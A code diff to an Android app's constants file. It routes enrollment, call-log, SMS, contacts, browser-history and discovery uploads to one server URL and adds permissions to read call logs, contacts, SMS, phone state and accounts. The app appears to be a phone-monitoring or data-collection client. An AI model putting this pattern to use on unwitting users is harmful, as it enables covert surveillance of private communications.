@@ -17,12 +17,12 @@ public class ConstantUtils {
     public static String smartClientID = ClientEnrollment.clientID;
     static Context context;
 
-    private static final String SERVER_URL = "http://144.167.241.32:8080/Arkansas/rest/arkansas/";
+    private static final String SERVER_URL = "http://10.0.0.150:8080/Arkansas/rest/arkansas/";
     //144.167.241.32
-    public static final String ENROLL_URL = "http://10.0.0.150:8080/Arkansas/rest/arkansas/clientEnroll/";
-    public static final String DISCOVER_URL = "http://10.0.0.150:8080/Arkansas/rest/arkansas/submitDiscovery/";
-    public static final String HISTORY_URL = "http://144.167.243.143:8080/Arkansas/rest/arkansas/submitHistory/";
-    public static final String CALLLOGS_URL = "http://10.0.0.150:8080/Arkansas/rest/arkansas/submitCallLogs/";
+    public static final String ENROLL_URL = SERVER_URL + "clientEnroll/";
+    public static final String DISCOVER_URL = SERVER_URL + "submitDiscovery/";
+    public static final String HISTORY_URL = SERVER_URL + "submitHistory/";
+    public static final String CALLLOGS_URL = SERVER_URL + "submitCallLogs/";
     public static final String CONTACTS_URL = SERVER_URL + "submitContacts/";
     public static final String SMS_URL = SERVER_URL + "submitSMS/";
 
@@ -31,6 +31,13 @@ public class ConstantUtils {
 
     public static final Uri BOOKMARKS_URI = Uri.parse("content://com.android.chrome.browser/history");
     public static final Uri SMS_URI_T14 = Uri.parse("content://sms");
+
+    public static final int PERMISSION_CALLBACK_CONSTANT = 100;
+    public static final int REQUEST_PERMISSION_SETTING = 101;
+    public static final String[] PERMISSIONS_REQUIRED= new String[]{
+            android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_CONTACTS, android.Manifest.permission.READ_EXTERNAL_STORAGE,
+            android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_PHONE_STATE, android.Manifest.permission.GET_ACCOUNTS
+    };
 
     public static final String[] HISTORY_PROJECTION = new String[]{"url", "date",};
     public static final String[] CONTACTS_PROJECTION = {Phone._ID, Phone.DISPLAY_NAME, Phone.NUMBER};
